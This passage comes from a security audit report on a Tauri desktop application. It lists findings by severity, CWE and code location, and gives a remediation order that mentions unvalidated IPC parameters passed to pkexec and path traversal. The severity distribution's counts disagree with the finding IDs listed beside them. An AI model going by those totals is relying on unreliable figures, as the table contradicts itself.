| SA-117 | Medium | CWE-749 | Configuration | `tauri.conf.json:13` |
| SA-118 | Medium | CWE-862 | Authorization | `capabilities/default.json` |
| SA-119 | High | CWE-20 | Input Validation | `commands.rs:349-566` |
| SA-120 | High | CWE-22 | Path Traversal | `commands.rs:369-464` |
| SA-121 | Medium | CWE-73 | File Write | `commands.rs:641-703` |
| SA-122 | Low | CWE-22 | Path Traversal | `commands.rs:1151-1216` |
| SA-123 | Low | CWE-73 | Input Validation | `commands.rs:1031-1063` |
| SA-124 | Info | N/A | Serialisation | `commands.rs` (positive) |
| SA-125 | Low | CWE-502 | Serialisation | `commands.rs:381-442` |
| SA-126 | Medium | CWE-833 | Concurrency | `commands.rs:27`, `main.rs:22` |
| SA-127 | Medium | CWE-362 | Concurrency | `commands.rs:349-471` |
| SA-128 | Info | N/A | XSS | `components/` (positive) |
| SA-129 | Low | CWE-79 | XSS | `theme_toggle.rs:66-75` |
| SA-130 | Info | N/A | Storage | `theme_toggle.rs:78-90` (positive) |
| SA-131 | Low | CWE-200 | Info Disclosure | `commands.rs:780-796` |
| SA-132 | Low | CWE-209 | Info Disclosure | `commands.rs` (multiple) |
| SA-133 | Medium | CWE-522 | Credential | `commands.rs:878-901` |
| SA-134 | Low | CWE-233 | Code Quality | `tauri_bindings.rs` (multiple) |
| SA-135 | Medium | CWE-799 | Rate Limiting | `commands.rs:349-548` |
| SA-136 | Low | CWE-20 | Input Validation | `commands.rs:393-445` |

### Severity Distribution

| Severity | Count |
|----------|-------|
| High | 2 (SA-119, SA-120) |
| Medium | 6 (SA-117, SA-118, SA-121, SA-126, SA-127, SA-133, SA-135) |
| Low | 8 (SA-115, SA-122, SA-123, SA-125, SA-129, SA-131, SA-132, SA-134, SA-136) |
| Informational | 4 (SA-116, SA-124, SA-128, SA-130) |

### Priority Remediation Order

1. **SA-119** (High): Add input validation layer for all IPC-to-pkexec parameters (fixes SA-026/027/028/106/108/110)
2. **SA-120** (High): Restrict config_path to allowed directories (fixes SA-107/031)
3. **SA-117** (Medium): Disable `withGlobalTauri` to limit IPC surface
4. **SA-127** (Medium): Add server-side operation serialisation lock
5. **SA-135** (Medium): Add rate limiting for privileged operations
6. **SA-133** (Medium): Validate remote host profile fields
7. **SA-121** (Medium): Validate export report output path
8. **SA-126** (Medium): Replace `std::sync::Mutex` with `tokio::sync::Mutex`
9. **SA-118** (Medium): Document and constrain command capabilities
10. **SA-123/SA-122** (Low): Validate scheduler config content and config paths

---

**Last Updated:** 2026-02-25
